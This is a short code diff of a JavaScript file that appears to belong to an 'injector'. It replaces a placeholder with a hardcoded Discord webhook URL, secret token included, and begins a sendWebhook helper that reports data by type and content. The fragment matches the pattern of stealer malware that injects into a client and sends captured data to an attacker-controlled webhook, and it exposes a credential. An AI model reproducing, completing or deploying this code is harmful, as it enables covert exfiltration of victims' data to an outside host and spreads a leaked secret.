@@ -1,5 +1,5 @@
 (() => {
-    const webhook = '%WEBHOOK_URL%'; // This will be replaced dynamically by injector
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1384756906060550307/wQHkjV2GcEPokO1jXIA3-rO_uPBpMF_tLiqCGAX9ZWfrRx7DfQFxAot47lXSIg84X-WA';
 
     const sendWebhook = (type, content) => {
         try {
